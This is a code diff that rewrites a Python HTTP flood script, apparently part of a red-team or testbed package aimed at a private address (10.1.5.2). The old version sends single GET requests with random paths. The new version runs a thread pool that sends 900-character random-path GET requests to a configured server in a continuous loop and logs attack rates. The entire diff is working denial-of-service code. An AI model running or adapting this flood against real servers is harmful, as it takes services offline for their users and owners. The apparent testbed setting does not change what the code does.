@@ -1,77 +1,47 @@
-
-
-# TO TEST ON THE NODE
-
-import random
 import socket
-import string
-import sys
 import threading
 import time
+from multiprocessing.pool import ThreadPool
 
-# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
+from loguru import logger
+
+from red.config import config
+from red.utils import generate_random_string
+
 TARGET_IP = "10.1.5.2"
-port = 80
+connection_time = 0.5
+random_size = 900
+payload_length = len((f"GET {generate_random_string(random_size)} HTTP/1.1\nHost: {TARGET_IP}\n\n").encode())
+pps = payload_length / connection_time
+bps = (20 + 20 + 1) * 8 * pps
 
-# Print thread status
-def print_status(thread_num, thread_num_mutex):
-    thread_num_mutex.acquire(True)
+stop = threading.Event()
 
-    thread_num += 1
-    #print the output on the sameline
-    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
-    sys.stdout.flush()
-    thread_num_mutex.release()
-
-
-# Generate URL Path
-def generate_url_path():
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
+def http_flood(_: None):
+    while not stop.is_set():
+        try:
+            sock = socket.socket()
+            sock.connect((config.server_host, config.server_port))
+            payload = (f"GET {generate_random_string(random_size)} HTTP/1.1\nHost: {TARGET_IP}\n\n").encode()
+            sock.send(payload)
+            sock.close()
+        except TimeoutError:
+            logger.info("Got a timeout :tada:!")
 
 
-# Perform the request
-def attack():#thread_num, thread_num_mutex):
-    # print_status(thread_num, thread_num_mutex)
-    url_path = generate_url_path()
+def run():
+    threads = int(config.attack.cli.pps)
+    logger.info(f"Starting with: "
+                f"{connection_time} "
+                f"{payload_length} "
+                f"{pps} "
+                f"{bps} "
+                f"{threads} ")
 
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        # Open the connection on that raw socket
-        dos.connect((TARGET_IP, port))
-
-        # Send the request according to HTTP spec
-        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        byt = (f"GET /{url_path} HTTP/1.1\nHost: {TARGET_IP}\n\n").encode()
-        dos.send(byt)
-    except socket.error:
-        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
-
-def run():#SOURCE_IP="10.1.5.3", count=100):
-    # Create a shared variable for thread counts
-    # thread_num = 0
-    # thread_num_mutex = threading.Lock()
-    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)}")# || # Requests: {str(count)}")
-
-    # Spawn a thread per request
-    # all_threads = []
-    # for _ in range(count):
-    # t1 = threading.Thread(target=attack, args=(thread_num, thread_num_mutex,))
-    # t1.start()
-    attack()
-    # all_threads.append(t1)
-
-    # Adjusting this sleep time will affect requests per second
-    # time.sleep(0.01)
-
-    # t1.join()
-
-    # for current_thread in all_threads:
-    #     current_thread.join()  # Make the main thread wait for the children threads
+    with ThreadPool(threads) as pool:
+        pool.map(http_flood, [None] * threads)
+    while True:
+        try:
+            time.sleep(1)
+        except KeyboardInterrupt:
+            stop.set()
